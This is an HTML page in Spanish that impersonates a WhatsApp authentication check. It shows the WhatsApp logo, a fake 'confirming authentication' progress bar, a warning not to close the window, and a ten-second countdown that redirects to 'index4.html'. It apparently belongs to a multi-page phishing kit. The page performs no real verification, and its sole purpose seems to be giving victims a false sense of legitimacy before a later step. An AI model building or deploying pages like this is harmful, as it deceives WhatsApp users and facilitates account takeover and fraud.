<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Confirmando autenticación...</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(120deg, #e0ffe8 0%, #b8e1fc 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #075e54;
    }
    .container {
      text-align: center;
      max-width: 400px;
      width: 90%;
    }
    .logo {
      margin-bottom: 20px;
    }
    .logo img {
      width: 64px;
      height: 64px;
    }
    h1 {
      font-size: 20px;
      margin-bottom: 10px;
    }
    .progress-bar {
      width: 100%;
      background-color: #e0e0e0;
      border-radius: 10px;
      overflow: hidden;
      margin: 20px 0;
    }
    .progress {
      height: 16px;
      background-color: #25d366;
      width: 0%;
      transition: width 1s linear;
    }
    .countdown {
      font-size: 16px;
      margin-bottom: 10px;
    }
    .warning {
      font-size: 14px;
      color: #d32f2f;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
    </div>
    <h1>Confirmando autenticación…</h1>
    <div class="progress-bar">
      <div class="progress" id="progress"></div>
    </div>
    <div class="countdown">Redirigiendo en <span id="seconds">10</span> segundos…</div>
    <div class="warning">⚠️ No cierres esta ventana hasta completar los pasos.</div>
  </div>

  <script>
    const duration = 10;
    let secondsLeft = duration;
    const progress = document.getElementById('progress');
    const seconds = document.getElementById('seconds');

    const interval = setInterval(() => {
      secondsLeft--;
      seconds.textContent = secondsLeft;
      progress.style.width = `${((duration - secondsLeft) / duration) * 100}%`;

      if (secondsLeft <= 0) {
        clearInterval(interval);
        window.location.href = 'index4.html';
      }
    }, 1000);
  </script>
</body>
</html>
